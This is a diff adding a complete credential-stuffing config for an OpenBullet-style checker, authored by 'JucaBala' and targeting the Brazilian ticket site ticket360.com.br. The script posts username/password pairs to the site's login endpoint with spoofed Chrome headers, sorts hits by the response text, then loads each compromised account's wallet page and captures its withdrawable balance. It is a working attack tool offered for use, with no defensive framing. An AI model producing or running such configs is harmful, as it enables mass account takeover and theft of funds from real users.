@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Ticket360 By.JucaBala",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-11T09:52:03.4925827-03:00",
+  "AdditionalInfo": "",
+  "Author": "JucaBala#9999",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.ticket360.com.br/usuario/login-ajax" 
+  CONTENT "nome=<USER>&senha=<PASS>&redirect=&idFacebook=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "content-length: 65" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://www.ticket360.com.br" 
+  HEADER "referer: https://www.ticket360.com.br/sub-categoria/1279/menos-e-mais" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true,\"message\":\"ok\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false,\"message\":\"Dados de acesso inv" 
+
+REQUEST GET "https://www.ticket360.com.br/minha-carteira" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "referer: https://www.ticket360.com.br/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "Saldo disponível para saque <strong>" "</strong>" CreateEmpty=FALSE -> CAP "" "SALDO " "" 
+
